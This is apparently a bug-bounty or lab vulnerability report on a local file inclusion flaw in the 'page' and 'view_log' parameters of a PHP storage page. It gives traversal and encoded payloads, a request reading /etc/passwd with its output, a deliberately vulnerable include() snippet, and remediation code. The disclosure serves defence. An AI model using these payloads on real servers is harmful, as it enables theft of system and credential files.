# Local File Inclusion (LFI) / Path Traversal

## Summary

I identified a Local File Inclusion (LFI) / Path Traversal vulnerability in the `page` and `view_log` parameters of the application.

The application accepts user-controlled input through these parameters and uses it to read files from the server without proper validation or sanitization. By injecting path traversal sequences (`../`) or specifying absolute paths, an attacker can read sensitive files outside the intended directory, including system configuration files like `/etc/passwd`.

An attacker can craft a malicious URL that reads arbitrary files from the server, potentially leading to information disclosure, credential theft, or further exploitation.

## Vulnerability Type

**Local File Inclusion (LFI) / Path Traversal**

## Vulnerable Parameters

```text
page
view_log
```

## Vulnerable URLs

```text
https://kzlabs.in/subdomains/storage/?page=posts
https://kzlabs.in/subdomains/storage/?view_log=/etc/passwd
```

## Steps to Reproduce

1. Navigate to the vulnerable storage page at `https://kzlabs.in/subdomains/storage/`.

2. Replace the value of the `page` parameter with a path traversal payload:

   ```text
   /etc/passwd
   ```

3. Visit the crafted URL:

   ```text
   https://kzlabs.in/subdomains/storage/?page=/etc/passwd
   ```

4. Observe that the application reads and displays the contents of `/etc/passwd` in the response.

5. The output reveals system user accounts, including the `root` user.

## Payloads Used

```text
/etc/passwd
../../../../../../../../etc/passwd
....//....//....//....//....//....//....//etc/passwd
```

URL-encoded versions:
```text
%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```

## Proof of Concept

The application takes the `page` or `view_log` parameter and uses it to read a file without validation:

```php
<?php
$page = $_GET['page'];
include("/var/www/storage/" . $page);
?>
```

The request:

```http
GET /subdomains/storage/?view_log=/etc/passwd HTTP/2
Host: kzlabs.in
Cookie: PHPSESSID=04sv3msp8c0c4agrr7flkesno2
```

Response:

```
Log File: /etc/passwd

File Content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
...
```

This confirms that arbitrary file reading is possible on the server.

## Impact

An attacker can:

- Read sensitive system files (`/etc/passwd`, `/etc/shadow`, `/etc/hosts`)
- Read application configuration files (database credentials, API keys)
- Read application source code
- Extract sensitive user data
- Enumerate system users and services
- Potentially achieve Remote Code Execution (RCE) by reading log files or combining with other vulnerabilities
- Bypass authentication by reading session files or configuration

## Recommendation

To mitigate this vulnerability:

- **Avoid User-Controlled Paths**: Do not use user input directly to determine file paths.

- **Use a Whitelist**: Only allow specific, pre-approved files to be accessed.
  ```php
  $allowed_pages = ['posts', 'about', 'contact', 'faq'];
  if (!in_array($_GET['page'], $allowed_pages)) {
      die("Page not allowed.");
  }
  ```

- **Validate Input**: Use `basename()` to prevent directory traversal.
  ```php
  $page = basename($_GET['page']);
  $path = "/var/www/storage/" . $page . ".php";
  ```

- **Use Realpath**: Resolve the real path and verify it's within the intended directory.
  ```php
  $base_dir = '/var/www/storage/';
  $real_path = realpath($base_dir . $_GET['page']);
  if (strpos($real_path, $base_dir) !== 0) {
      die("Invalid file path.");
  }
  ```

- **Disable `allow_url_include`**: Prevent remote file inclusion in `php.ini`.
  ```ini
  allow_url_include = Off
  allow_url_fopen = Off
  ```

- **Chroot Jail**: Restrict the web server to a specific directory.

- **Principle of Least Privilege**: Run the web server with minimal permissions.

- **Web Application Firewall (WAF)**: Deploy a WAF to detect and block path traversal payloads.

- **Regular Security Audits**: Conduct regular assessments to identify vulnerabilities.
